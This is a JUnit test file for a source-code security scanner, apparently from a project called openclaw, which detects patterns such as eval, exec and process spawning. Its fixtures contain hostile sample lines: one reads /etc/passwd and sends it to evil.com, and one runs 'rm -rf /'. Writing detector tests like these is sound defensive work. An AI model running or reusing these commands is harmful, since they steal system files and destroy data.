package com.openclaw.common.security;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Tests for {@link SkillScanner} — source code security scanning.
 */
class SkillScannerTest {

    // -----------------------------------------------------------------------
    // Line-level rules
    // -----------------------------------------------------------------------

    @Test
    void scanSource_detects_exec() {
        String code = "const result = execSync('ls -la');";
        var findings = SkillScanner.scanSource(code, "test.js");
        assertFalse(findings.isEmpty());
        assertTrue(findings.stream().anyMatch(f -> f.ruleId().equals("dangerous-exec")));
    }

    @Test
    void scanSource_detects_eval() {
        String code = "const x = eval('1 + 2');";
        var findings = SkillScanner.scanSource(code, "test.js");
        assertTrue(findings.stream().anyMatch(f -> f.ruleId().equals("eval-usage")));
    }

    @Test
    void scanSource_detects_functionConstructor() {
        String code = "const fn = new Function('return 42');";
        var findings = SkillScanner.scanSource(code, "test.js");
        assertTrue(findings.stream().anyMatch(f -> f.ruleId().equals("function-constructor")));
    }

    @Test
    void scanSource_detects_envAccess() {
        String code = "const key = process.env.API_KEY;";
        var findings = SkillScanner.scanSource(code, "test.js");
        assertTrue(findings.stream().anyMatch(f -> f.ruleId().equals("env-access")));
    }

    @Test
    void scanSource_detects_runtimeExec() {
        String code = "Runtime.getRuntime().exec(\"whoami\");";
        var findings = SkillScanner.scanSource(code, "Main.java");
        assertTrue(findings.stream().anyMatch(f -> f.ruleId().equals("runtime-exec")));
    }

    @Test
    void scanSource_detects_processBuilder() {
        String code = "new ProcessBuilder(\"bash\", \"-c\", cmd).start();";
        var findings = SkillScanner.scanSource(code, "Main.java");
        assertTrue(findings.stream().anyMatch(f -> f.ruleId().equals("process-builder")));
    }

    @Test
    void scanSource_cleanCode_noFindings() {
        String code = """
                function add(a, b) {
                    return a + b;
                }
                console.log(add(1, 2));
                """;
        var findings = SkillScanner.scanSource(code, "clean.js");
        assertTrue(findings.isEmpty());
    }

    // -----------------------------------------------------------------------
    // Source-level rules
    // -----------------------------------------------------------------------

    @Test
    void scanSource_detects_potentialExfiltration() {
        String code = """
                const data = fs.readFileSync('/etc/passwd');
                fetch('https://evil.com/steal', { method: 'POST', body: data });
                """;
        var findings = SkillScanner.scanSource(code, "exfil.js");
        assertTrue(findings.stream().anyMatch(f -> f.ruleId().equals("potential-exfiltration")));
    }

    // -----------------------------------------------------------------------
    // Directory scanning
    // -----------------------------------------------------------------------

    @Test
    void scanDirectory_emptyDir(@TempDir Path tempDir) throws IOException {
        var findings = SkillScanner.scanDirectory(tempDir);
        assertTrue(findings.isEmpty());
    }

    @Test
    void scanDirectory_withDangerousFile(@TempDir Path tempDir) throws IOException {
        Files.writeString(tempDir.resolve("danger.js"), "eval('alert(1)');");
        var findings = SkillScanner.scanDirectory(tempDir);
        assertFalse(findings.isEmpty());
        assertTrue(findings.stream().anyMatch(f -> f.ruleId().equals("eval-usage")));
    }

    @Test
    void scanDirectoryWithSummary(@TempDir Path tempDir) throws IOException {
        Files.writeString(tempDir.resolve("exec.js"), "execSync('rm -rf /');");
        Files.writeString(tempDir.resolve("safe.js"), "console.log('hello');");
        var summary = SkillScanner.scanDirectoryWithSummary(tempDir);
        assertEquals(2, summary.scannedFiles());
        assertTrue(summary.critical() > 0);
    }

    @Test
    void scanDirectory_skipsNodeModules(@TempDir Path tempDir) throws IOException {
        Path nm = tempDir.resolve("node_modules");
        Files.createDirectories(nm);
        Files.writeString(nm.resolve("evil.js"), "eval('bad');");
        var findings = SkillScanner.scanDirectory(tempDir);
        assertTrue(findings.isEmpty());
    }

    // -----------------------------------------------------------------------
    // Evidence truncation
    // -----------------------------------------------------------------------

    @Test
    void scanSource_longLine_truncatesEvidence() {
        String longLine = "eval(" + "x".repeat(200) + ");";
        var findings = SkillScanner.scanSource(longLine, "test.js");
        assertFalse(findings.isEmpty());
        assertTrue(findings.get(0).evidence().length() <= 123); // 120 + "..."
    }
}
